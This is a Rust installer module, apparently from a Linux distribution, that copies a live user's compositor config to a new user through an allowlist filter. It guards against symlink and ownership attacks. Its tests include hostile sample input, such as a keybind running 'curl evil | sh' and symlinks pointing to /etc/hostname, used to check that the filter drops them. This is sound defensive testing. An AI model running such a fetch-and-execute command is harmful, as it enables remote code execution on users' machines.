// SPDX-License-Identifier: AGPL-3.0-only
//! The seed (D-07 §5): the live `liveuser`'s `abyss.kdl` becomes the new user's,
//! minus everything that is not a presentation or preference key.
//!
//! The file is written by a same-uid process, so to this root program it is
//! *untrusted input*. Consequently:
//!
//! * the path is derived from passwd for a uid that `PKEXEC_UID` merely hints
//!   at, never from the environment;
//! * every directory on the way and the file itself are opened `O_NOFOLLOW`
//!   from a directory fd, checked to be owned by that uid, and the file is read
//!   **once**, bounded, from that one open;
//! * the bytes read are parsed and filtered by an allowlist, and what is
//!   written is *regenerated from the parsed values* of the allowed nodes, so
//!   nothing else in the file (comments, unknown keys, commands) can travel;
//! * no message says what the file contained: only a count of rejected keys.

use crate::env::Env;
use crate::error::{io, Error, Result};
use crate::passwd::{self, PwEntry};
use kdl::{KdlDocument, KdlEntry, KdlNode, KdlValue};
use rustix::fs::{chown, fchown, openat, Gid, Mode, OFlags, Uid, CWD};
use rustix::io::Errno;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::os::fd::AsFd;
use std::os::unix::fs::{DirBuilderExt, MetadataExt, OpenOptionsExt};
use std::path::{Component, Path, PathBuf};

pub const MAX_SEED_BYTES: usize = 64 * 1024;
const MAX_DEPTH: usize = 8;
const MAX_NODES: usize = 1024;
const MAX_STRING: usize = 256;

/// Where the seed lives, relative to the caller's home, and where it goes,
/// relative to the new user's. One fixed path, both ends.
const SEED_DIRS: [&str; 2] = [".config", "eclipse"];
const SEED_FILE: &str = "abyss.kdl";

enum Verdict {
    /// The node and everything under it is kept (each still checked for shape).
    Full,
    /// A container on the way to allowed keys: kept only for what it holds.
    Partial,
    Drop,
}

/// The allowlist, and the whole of it: `input.kb-*`, `general.layout`,
/// `decoration.*`, `animations.*`, `bar.*`, `mode`, `components.*`, `setup.*`.
/// Anything not named here is dropped, so a key added to the schema later (an
/// exec-style one included) is dropped until someone decides otherwise. That
/// covers `bind`, `gesture`, `mousebind`, `windowrule`, `output`, `idle.*`,
/// `misc.*` (`terminal-command`, `render-device`), `xwayland` and `render`.
fn verdict(path: &[&str]) -> Verdict {
    match path {
        ["mode"] => Verdict::Full,
        ["input"] => Verdict::Partial,
        ["input", k] if k.starts_with("kb-") => Verdict::Full,
        ["general"] => Verdict::Partial,
        ["general", "layout"] => Verdict::Full,
        ["decoration" | "animations" | "bar" | "components" | "setup"] => Verdict::Partial,
        ["decoration" | "animations" | "bar" | "components" | "setup", _] => Verdict::Full,
        _ => Verdict::Drop,
    }
}

struct Walk {
    rejected: usize,
    nodes: usize,
}

impl Walk {
    /// Bounds the work an adversarial file can cause.
    fn admit(&mut self) -> bool {
        self.nodes += 1;
        if self.nodes > MAX_NODES {
            self.rejected += 1;
            return false;
        }
        true
    }
}

fn scalar(v: &KdlValue) -> bool {
    match v {
        KdlValue::String(s) => s.len() <= MAX_STRING,
        KdlValue::Integer(_) | KdlValue::Float(_) | KdlValue::Bool(_) => true,
        _ => false,
    }
}

/// Rebuild a kept node from its parsed parts. Type annotations, nulls and long
/// strings make the node be dropped rather than repaired.
fn rebuild(node: &KdlNode, depth: usize, w: &mut Walk) -> Option<KdlNode> {
    if depth > MAX_DEPTH || node.ty().is_some() {
        return None;
    }
    let mut out = KdlNode::new(node.name().value());
    for e in node.entries() {
        if e.ty().is_some() || !scalar(e.value()) {
            return None;
        }
        out.entries_mut().push(match e.name() {
            Some(k) => KdlEntry::new_prop(k.value(), e.value().clone()),
            None => KdlEntry::new(e.value().clone()),
        });
    }
    if let Some(ch) = node.children() {
        let mut kids = Vec::new();
        for c in ch.nodes() {
            if !w.admit() {
                continue;
            }
            match rebuild(c, depth + 1, w) {
                Some(k) => kids.push(k),
                None => w.rejected += 1,
            }
        }
        if !kids.is_empty() {
            let mut d = KdlDocument::new();
            d.nodes_mut().extend(kids);
            out.set_children(d);
        }
    }
    Some(out)
}

fn filter_level(doc: &KdlDocument, path: &mut Vec<String>, w: &mut Walk) -> Vec<KdlNode> {
    let mut out = Vec::new();
    for node in doc.nodes() {
        if !w.admit() {
            continue;
        }
        path.push(node.name().value().to_owned());
        let refs: Vec<&str> = path.iter().map(String::as_str).collect();
        match verdict(&refs) {
            Verdict::Drop => w.rejected += 1,
            Verdict::Full => match rebuild(node, path.len(), w) {
                Some(n) => out.push(n),
                None => w.rejected += 1,
            },
            Verdict::Partial => {
                // A container has no values of its own; if it has any they go.
                if node.ty().is_some() || !node.entries().is_empty() {
                    w.rejected += 1;
                }
                let kids = node
                    .children()
                    .map(|c| filter_level(c, path, w))
                    .unwrap_or_default();
                if !kids.is_empty() {
                    let mut n = KdlNode::new(node.name().value());
                    let mut d = KdlDocument::new();
                    d.nodes_mut().extend(kids);
                    n.set_children(d);
                    out.push(n);
                }
            }
        }
        path.pop();
    }
    out
}

/// Parse `bytes` as a KDL v2 document and keep only allowlisted keys. Returns
/// the regenerated file and how many nodes were rejected. A file that does not
/// parse is an error with a fixed message: the parser's own message quotes the
/// source, and that would make this a reader of whatever the path pointed at.
pub fn filter_seed(bytes: &[u8]) -> Result<(Vec<u8>, usize)> {
    if bytes.len() > MAX_SEED_BYTES {
        return Err(Error::Refused("seed too large"));
    }
    let text = std::str::from_utf8(bytes).map_err(|_| Error::Refused("seed not valid"))?;
    let doc = KdlDocument::parse_v2(text).map_err(|_| Error::Refused("seed not valid"))?;
    let mut w = Walk {
        rejected: 0,
        nodes: 0,
    };
    let kept = filter_level(&doc, &mut Vec::new(), &mut w);
    let mut out = KdlDocument::new();
    out.nodes_mut().extend(kept);
    out.autoformat_no_comments();
    let s = if out.nodes().is_empty() {
        String::new()
    } else {
        out.to_string()
    };
    Ok((s.into_bytes(), w.rejected))
}

pub enum SeedRead {
    Absent,
    /// A symlink, a non-regular file, someone else's file, or too big.
    Refused,
    Bytes(Vec<u8>),
}

fn open_dir(parent: Option<&File>, name: &Path, uid: u32) -> std::result::Result<File, SeedRead> {
    let flags = OFlags::RDONLY | OFlags::DIRECTORY | OFlags::NOFOLLOW | OFlags::CLOEXEC;
    let fd = match parent {
        Some(p) => openat(p.as_fd(), name, flags, Mode::empty()),
        None => openat(CWD, name, flags, Mode::empty()),
    };
    let f = match fd {
        Ok(fd) => File::from(fd),
        Err(Errno::NOENT) => return Err(SeedRead::Absent),
        Err(_) => return Err(SeedRead::Refused),
    };
    match f.metadata() {
        Ok(md) if md.uid() == uid => Ok(f),
        _ => Err(SeedRead::Refused),
    }
}

/// Read `<home>/.config/eclipse/abyss.kdl` once. Every step is `O_NOFOLLOW`
/// relative to the previous directory fd, and owned by `uid`, so a symlink
/// anywhere in the last three components, or a file that is not the caller's
/// own regular file, is refused. The file is opened non-blocking so a FIFO
/// cannot hang the helper, then rejected by type.
pub fn read_seed(home: &Path, uid: u32) -> SeedRead {
    let mut dir = match open_dir(None, home, uid) {
        Ok(d) => d,
        Err(e) => return e,
    };
    for name in SEED_DIRS {
        dir = match open_dir(Some(&dir), Path::new(name), uid) {
            Ok(d) => d,
            Err(e) => return e,
        };
    }
    let flags = OFlags::RDONLY | OFlags::NOFOLLOW | OFlags::NONBLOCK | OFlags::CLOEXEC;
    let f = match openat(dir.as_fd(), SEED_FILE, flags, Mode::empty()) {
        Ok(fd) => File::from(fd),
        Err(Errno::NOENT) => return SeedRead::Absent,
        Err(_) => return SeedRead::Refused,
    };
    match f.metadata() {
        Ok(md) if md.is_file() && md.uid() == uid && md.len() <= MAX_SEED_BYTES as u64 => {}
        _ => return SeedRead::Refused,
    }
    let mut buf = Vec::new();
    match f.take(MAX_SEED_BYTES as u64 + 1).read_to_end(&mut buf) {
        Ok(n) if n <= MAX_SEED_BYTES => SeedRead::Bytes(buf),
        _ => SeedRead::Refused,
    }
}

/// `PKEXEC_UID` is a hint. Accept it only if it names a real, non-root,
/// non-system user in passwd, and use passwd's uid and home from then on.
pub fn resolve_caller(hint: Option<&str>, passwd_text: &str, uid_min: u32) -> Option<PwEntry> {
    let h = hint?;
    if h.is_empty() || h.len() > 10 || !h.bytes().all(|c| c.is_ascii_digit()) {
        return None;
    }
    let uid: u32 = h.parse().ok()?;
    if uid == 0 || uid < uid_min || uid >= 65534 {
        return None;
    }
    let e = passwd::by_uid(passwd_text, uid)?;
    (e.name != "root").then_some(e)
}

fn target_home(target: &Path, home: &Path) -> Result<PathBuf> {
    let rel = home
        .strip_prefix("/")
        .map_err(|_| Error::Refused("target home"))?;
    if !rel.components().all(|c| matches!(c, Component::Normal(_))) {
        return Err(Error::Refused("target home"));
    }
    Ok(target.join(rel))
}

fn real_dir(p: &Path) -> Result<bool> {
    match fs::symlink_metadata(p) {
        Ok(md) if md.is_dir() => Ok(true),
        Ok(_) => Err(Error::Refused("seed target path")),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(false),
        Err(_) => Err(Error::Io("seed target path")),
    }
}

/// Write `<target home>/.config/eclipse/abyss.kdl` for `owner`. Fresh file
/// only (`O_EXCL`, `O_NOFOLLOW`), directories created here are chowned, and an
/// existing component that is a symlink is refused.
pub fn write_seed(target: &Path, owner: &PwEntry, bytes: &[u8]) -> Result<PathBuf> {
    let (uid, gid) = (Uid::from_raw(owner.uid), Gid::from_raw(owner.gid));
    let mut dir = target_home(target, &owner.home)?;
    if !real_dir(&dir)? {
        return Err(Error::Refused("new user's home missing"));
    }
    for name in SEED_DIRS {
        dir.push(name);
        if !real_dir(&dir)? {
            fs::DirBuilder::new()
                .mode(0o755)
                .create(&dir)
                .map_err(io("create seed dir"))?;
            chown(&dir, Some(uid), Some(gid)).map_err(io("chown seed dir"))?;
        }
    }
    let path = dir.join(SEED_FILE);
    let mut f = fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .custom_flags(OFlags::NOFOLLOW.bits() as i32)
        .mode(0o644)
        .open(&path)
        .map_err(io("create seed file"))?;
    fchown(&f, Some(uid), Some(gid)).map_err(io("chown seed file"))?;
    f.write_all(bytes).map_err(io("write seed file"))?;
    Ok(path)
}

#[derive(Debug, PartialEq, Eq)]
pub enum SeedOutcome {
    /// No usable caller uid: nothing to read.
    Skipped,
    Absent,
    Refused,
    Invalid,
    Nothing {
        rejected: usize,
    },
    Copied {
        rejected: usize,
    },
}

impl SeedOutcome {
    /// Fixed vocabulary plus a number. Never file content.
    pub fn message(&self) -> String {
        match self {
            SeedOutcome::Skipped => "seed skipped: no caller".into(),
            SeedOutcome::Absent => "seed absent".into(),
            SeedOutcome::Refused => "seed refused".into(),
            SeedOutcome::Invalid => "seed rejected: not a valid config".into(),
            SeedOutcome::Nothing { rejected } => {
                format!("seed empty, {rejected} key(s) rejected")
            }
            SeedOutcome::Copied { rejected } => {
                format!("seed carried, {rejected} key(s) rejected")
            }
        }
    }
}

/// The Seed stage. A seed that cannot be carried never fails the install: the
/// target boots on shipped defaults and the outcome is reported (D-07 §5). Only
/// a failure on the *target* side is an error.
pub fn run(env: &Env, username: &str) -> Result<SeedOutcome> {
    let p = &env.paths;
    let live_pw = fs::read_to_string(&p.passwd).map_err(io("read passwd"))?;
    let Some(caller) = resolve_caller(env.caller_uid_hint.as_deref(), &live_pw, p.uid_min) else {
        return Ok(SeedOutcome::Skipped);
    };
    let bytes = match read_seed(&caller.home, caller.uid) {
        SeedRead::Absent => return Ok(SeedOutcome::Absent),
        SeedRead::Refused => return Ok(SeedOutcome::Refused),
        SeedRead::Bytes(b) => b,
    };
    let Ok((out, rejected)) = filter_seed(&bytes) else {
        return Ok(SeedOutcome::Invalid);
    };
    if out.is_empty() {
        return Ok(SeedOutcome::Nothing { rejected });
    }
    let tp = fs::read_to_string(p.target.join("etc/passwd")).map_err(io("read target passwd"))?;
    let owner = passwd::by_name(&tp, username).ok_or(Error::Io("new user missing"))?;
    write_seed(&p.target, &owner, &out)?;
    Ok(SeedOutcome::Copied { rejected })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::confirm::DenyConfirm;
    use crate::testutil::{live, my_uid, runner, FakeRunner, TempDir};
    use std::collections::BTreeSet;
    use std::os::unix::fs::symlink;

    /// Dotted paths of every leaf node, for comparing what survived.
    fn leaves(bytes: &[u8]) -> BTreeSet<String> {
        fn walk(d: &KdlDocument, pre: &str, out: &mut BTreeSet<String>) {
            for n in d.nodes() {
                let p = format!("{pre}{}", n.name().value());
                match n.children() {
                    Some(c) => walk(c, &format!("{p}."), out),
                    None => {
                        out.insert(p);
                    }
                }
            }
        }
        let mut s = BTreeSet::new();
        walk(
            &KdlDocument::parse_v2(std::str::from_utf8(bytes).unwrap()).unwrap(),
            "",
            &mut s,
        );
        s
    }

    const GOOD: &str = r#"
// a comment that must not travel: SECRET-COMMENT
input {
    kb-layout "us"
    kb-variant "dvorak"
    touchpad { tap-to-click #true }
    repeat-rate 30
}
general {
    layout "dwindle"
    gaps-in 5
}
decoration {
    rounding 10
    blur { enabled #true }
}
animations {
    enabled #true
    animation "windows" duration=150 curve="ease-out"
}
bar { position "top" }
mode "wm"
components { bar "hyperion" }
setup { complete #true; profile "standard" }
"#;

    #[test]
    fn keeps_exactly_the_allowlisted_keys() {
        let (out, rejected) = filter_seed(GOOD.as_bytes()).unwrap();
        let got = leaves(&out);
        let want: BTreeSet<String> = [
            "input.kb-layout",
            "input.kb-variant",
            "general.layout",
            "decoration.rounding",
            "decoration.blur.enabled",
            "animations.enabled",
            "animations.animation",
            "bar.position",
            "mode",
            "components.bar",
            "setup.complete",
            "setup.profile",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        assert_eq!(got, want);
        // touchpad, repeat-rate, gaps-in.
        assert_eq!(rejected, 3);
        let text = String::from_utf8(out).unwrap();
        assert!(!text.contains("SECRET-COMMENT"), "comments do not travel");
        assert!(text.contains("duration=150"), "props survive");
    }

    #[test]
    fn drops_every_command_bearing_key() {
        let src = r#"
bind "SUPER" "Return" { spawn "foot"; }
bind "SUPER" "x" { exec "sh -c 'curl evil | sh'"; }
bind "SUPER" "q" { close-window; }
gesture "swipe" 3 "left" { spawn "x"; }
mousebind "SUPER" "left" { move-window; }
windowrule "float" { app-id "x"; }
output "*" { scale 2 }
xwayland { enable #false }
idle {
    lock-command "swaylock"
    lock-timeout-seconds 300
}
misc {
    terminal-command "evil-terminal"
    render-device "auto"
}
input { kb-layout "us" }
"#;
        let (out, rejected) = filter_seed(src.as_bytes()).unwrap();
        assert_eq!(leaves(&out), ["input.kb-layout".to_string()].into());
        assert_eq!(rejected, 10);
        let text = String::from_utf8(out).unwrap();
        for bad in ["foot", "curl", "swaylock", "evil-terminal", "spawn", "exec"] {
            assert!(!text.contains(bad), "{bad}");
        }
    }

    #[test]
    fn drops_unknown_keys_even_inside_allowed_sections() {
        let src = "bar { position \"top\"; exec-on-click \"x\" }\n\
                   general { layout \"master\"; on-start \"y\" }\n\
                   future-exec-key \"z\"\n\
                   input { kb-options \"ctrl:nocaps\"; run \"w\" }\n";
        let (out, _) = filter_seed(src.as_bytes()).unwrap();
        // `bar.*` is allowlisted by section (D-07 §5), so its leaves are not
        // checked here; general and input are allowlisted by key.
        let got = leaves(&out);
        assert!(got.contains("bar.position"));
        assert!(got.contains("general.layout"));
        assert!(got.contains("input.kb-options"));
        assert!(!got.contains("general.on-start"));
        assert!(!got.contains("input.run"));
        assert!(!got.contains("future-exec-key"));
    }

    #[test]
    fn rejects_shapes_that_are_not_plain_values() {
        let src = "mode (u8)5\n\
                   components { bar #null; launcher \"ok\" }\n";
        let (out, rejected) = filter_seed(src.as_bytes()).unwrap();
        assert_eq!(leaves(&out), ["components.launcher".to_string()].into());
        assert_eq!(rejected, 2);
        let long = format!("mode \"{}\"\n", "a".repeat(300));
        assert!(filter_seed(long.as_bytes()).unwrap().0.is_empty());
    }

    #[test]
    fn invalid_or_oversized_input_is_an_error_that_quotes_nothing() {
        let junk = "mode \"unterminated TOPSECRET-CONTENT\ninput { {{{";
        let e = filter_seed(junk.as_bytes()).unwrap_err();
        assert!(!e.to_string().contains("TOPSECRET"));
        assert!(filter_seed(&[0xff, 0xfe, b'x']).is_err());
        assert!(filter_seed(&vec![b'a'; MAX_SEED_BYTES + 1]).is_err());
    }

    #[test]
    fn pathological_files_are_bounded() {
        let mut deep = String::from("components ");
        for _ in 0..40 {
            deep.push_str("{ a ");
        }
        for _ in 0..40 {
            deep.push('}');
        }
        assert!(filter_seed(deep.as_bytes()).is_ok());
        let many = "components {\n".to_string() + &"x 1\n".repeat(5000) + "}\n";
        let (out, rejected) = filter_seed(many.as_bytes()).unwrap();
        assert!(rejected > 0);
        assert!(leaves(&out).len() <= MAX_NODES);
    }

    fn seed_home(t: &TempDir, content: &str) -> PathBuf {
        let home = t.path().join("seedhome");
        fs::create_dir_all(home.join(".config/eclipse")).unwrap();
        fs::write(home.join(".config/eclipse/abyss.kdl"), content).unwrap();
        home
    }

    #[test]
    fn reads_a_regular_owned_file_and_reports_absence() {
        let t = TempDir::new();
        let home = seed_home(&t, "mode \"wm\"\n");
        assert!(matches!(read_seed(&home, my_uid()), SeedRead::Bytes(b) if b == b"mode \"wm\"\n"));
        fs::remove_file(home.join(".config/eclipse/abyss.kdl")).unwrap();
        assert!(matches!(read_seed(&home, my_uid()), SeedRead::Absent));
        assert!(matches!(
            read_seed(&t.path().join("nohome"), my_uid()),
            SeedRead::Absent
        ));
    }

    #[test]
    fn refuses_a_symlinked_file_at_every_level() {
        let t = TempDir::new();
        let secret = t.path().join("secret.kdl");
        fs::write(&secret, "mode \"wm\"\n").unwrap();

        // The file itself.
        let home = seed_home(&t, "");
        let f = home.join(".config/eclipse/abyss.kdl");
        fs::remove_file(&f).unwrap();
        symlink(&secret, &f).unwrap();
        assert!(matches!(read_seed(&home, my_uid()), SeedRead::Refused));

        // A directory on the way.
        let other = t.path().join("other");
        fs::create_dir_all(other.join("eclipse")).unwrap();
        fs::write(other.join("eclipse/abyss.kdl"), "mode \"wm\"\n").unwrap();
        let home2 = t.path().join("home2");
        fs::create_dir_all(&home2).unwrap();
        symlink(&other, home2.join(".config")).unwrap();
        assert!(matches!(read_seed(&home2, my_uid()), SeedRead::Refused));

        // The home directory itself.
        let real = seed_home(&t, "mode \"wm\"\n");
        let link = t.path().join("homelink");
        symlink(&real, &link).unwrap();
        assert!(matches!(read_seed(&link, my_uid()), SeedRead::Refused));
    }

    #[test]
    fn refuses_a_file_that_is_not_the_callers_or_not_regular() {
        let t = TempDir::new();
        let home = seed_home(&t, "mode \"wm\"\n");
        // Owned by someone else than the uid we were told.
        assert!(matches!(read_seed(&home, my_uid() + 1), SeedRead::Refused));
        // A directory where the file should be.
        let h2 = t.path().join("h2");
        fs::create_dir_all(h2.join(".config/eclipse/abyss.kdl")).unwrap();
        assert!(matches!(read_seed(&h2, my_uid()), SeedRead::Refused));
        // Too large.
        let h3 = seed_home(&t, &"a".repeat(MAX_SEED_BYTES + 1));
        assert!(matches!(read_seed(&h3, my_uid()), SeedRead::Refused));
    }

    #[test]
    fn caller_comes_from_passwd_and_only_for_real_users() {
        let pw = "root:x:0:0::/root:/bin/bash\n\
                  liveuser:x:1000:1000::/home/liveuser:/bin/bash\n\
                  daemon:x:2:2::/:/usr/bin/nologin\n\
                  nobody:x:65534:65534::/:/usr/bin/nologin\n";
        assert_eq!(resolve_caller(Some("1000"), pw, 1000).unwrap().name, "liveuser");
        for bad in [
            None,
            Some(""),
            Some("0"),
            Some("2"),
            Some("65534"),
            Some("4242"),
            Some("-1"),
            Some("1000 "),
            Some("0x3e8"),
            Some("99999999999"),
        ] {
            assert!(resolve_caller(bad, pw, 1000).is_none(), "{bad:?}");
        }
    }

    // ---- the stage, end to end against a tempdir "machine" ----

    fn env<'a>(p: crate::env::Paths, r: &'a FakeRunner, hint: Option<String>) -> Env<'a> {
        Env {
            paths: p,
            euid: 0,
            caller_uid_hint: hint,
            runner: r,
            confirm: &DenyConfirm,
        }
    }

    /// A live machine whose `liveuser` has `content` as its abyss.kdl, and a
    /// target with a fresh `chase`.
    fn machine_with_seed(content: &str) -> (TempDir, crate::env::Paths) {
        let (t, p) = live();
        let home = t.path().join("home/liveuser");
        fs::create_dir_all(home.join(".config/eclipse")).unwrap();
        fs::write(home.join(".config/eclipse/abyss.kdl"), content).unwrap();
        // Files the seed must never carry.
        fs::write(
            home.join(".config/eclipse/policy.kdl"),
            "capture { allow \"x\" }\n",
        )
        .unwrap();
        fs::write(
            home.join(".config/eclipse/outputs.kdl"),
            "output \"*\" { scale 2 }\n",
        )
        .unwrap();
        fs::create_dir_all(p.target.join("etc")).unwrap();
        fs::create_dir_all(p.target.join("home/chase")).unwrap();
        fs::write(
            p.target.join("etc/passwd"),
            format!(
                "chase:x:{}:{}::/home/chase:/bin/bash\n",
                my_uid(),
                rustix::process::getgid().as_raw()
            ),
        )
        .unwrap();
        (t, p)
    }

    #[test]
    fn stage_writes_the_filtered_file_and_nothing_else() {
        let src = format!("{GOOD}bind \"SUPER\" \"Return\" {{ spawn \"foot\"; }}\nmisc {{ terminal-command \"evil\" }}\nidle {{ lock-command \"x\" }}\n");
        let (_t, p) = machine_with_seed(&src);
        let r = runner();
        let out = run(&env(p, &r, Some(my_uid().to_string())), "chase").unwrap();
        assert!(matches!(out, SeedOutcome::Copied { rejected } if rejected == 6));
    }

    #[test]
    fn stage_output_lands_owned_and_contains_no_commands() {
        let src = "bind \"SUPER\" \"Return\" { spawn \"foot\"; }\nmode \"wm\"\n";
        let (_t, p) = machine_with_seed(src);
        let target = p.target.clone();
        let r = runner();
        let out = run(&env(p, &r, Some(my_uid().to_string())), "chase").unwrap();
        assert_eq!(out, SeedOutcome::Copied { rejected: 1 });
        let dir = target.join("home/chase/.config/eclipse");
        let text = fs::read_to_string(dir.join("abyss.kdl")).unwrap();
        assert!(text.contains("mode") && !text.contains("foot") && !text.contains("bind"));
        // Only that one file: no policy.kdl, no outputs.kdl.
        let names: Vec<_> = fs::read_dir(&dir)
            .unwrap()
            .map(|e| e.unwrap().file_name())
            .collect();
        assert_eq!(names, ["abyss.kdl"]);
        let md = fs::metadata(dir.join("abyss.kdl")).unwrap();
        assert_eq!(md.uid(), my_uid());
        assert_eq!(md.mode() & 0o777, 0o644);
    }

    #[test]
    fn stage_reports_invalid_without_copying_or_echoing() {
        let (_t, p) = machine_with_seed("mode \"broken TOPSECRET\n{{{");
        let target = p.target.clone();
        let r = runner();
        let out = run(&env(p, &r, Some(my_uid().to_string())), "chase").unwrap();
        assert_eq!(out, SeedOutcome::Invalid);
        assert!(!out.message().contains("TOPSECRET"));
        assert!(!target.join("home/chase/.config").exists());
    }

    #[test]
    fn stage_refuses_a_symlinked_seed_and_copies_nothing() {
        let (t, p) = machine_with_seed("mode \"wm\"\n");
        let f = t.path().join("home/liveuser/.config/eclipse/abyss.kdl");
        fs::remove_file(&f).unwrap();
        symlink("/etc/hostname", &f).unwrap();
        let target = p.target.clone();
        let r = runner();
        let out = run(&env(p, &r, Some(my_uid().to_string())), "chase").unwrap();
        assert_eq!(out, SeedOutcome::Refused);
        assert!(!target.join("home/chase/.config").exists());
    }

    #[test]
    fn stage_skips_without_a_usable_caller_hint() {
        for hint in [None, Some("0".to_string()), Some("junk".to_string())] {
            let (_t, p) = machine_with_seed("mode \"wm\"\n");
            let target = p.target.clone();
            let r = runner();
            assert_eq!(run(&env(p, &r, hint), "chase").unwrap(), SeedOutcome::Skipped);
            assert!(!target.join("home/chase/.config").exists());
        }
    }

    #[test]
    fn write_refuses_a_symlinked_config_dir_in_the_target() {
        let (t, p) = machine_with_seed("mode \"wm\"\n");
        let elsewhere = t.path().join("elsewhere");
        fs::create_dir_all(&elsewhere).unwrap();
        symlink(&elsewhere, p.target.join("home/chase/.config")).unwrap();
        let r = runner();
        assert!(run(&env(p, &r, Some(my_uid().to_string())), "chase").is_err());
        assert!(fs::read_dir(&elsewhere).unwrap().next().is_none());
    }
}
